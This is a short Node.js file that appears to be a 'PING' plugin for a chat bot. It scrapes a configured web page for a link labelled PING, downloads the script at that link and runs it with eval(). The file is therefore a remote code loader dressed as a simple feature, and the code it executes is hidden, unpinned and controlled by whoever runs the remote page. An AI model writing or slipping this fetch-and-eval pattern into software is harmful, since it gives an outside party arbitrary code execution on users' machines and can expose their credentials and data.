const axios = require('axios');
const cheerio = require('cheerio');
const Midknight = require(__dirname + "/../config");

async function fetchPINGUrl() {
  try {
    const response = await axios.get(Midknight.MIARA);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("PING")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('PING not found 😭');
    }

    console.log('PING loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchPINGUrl();
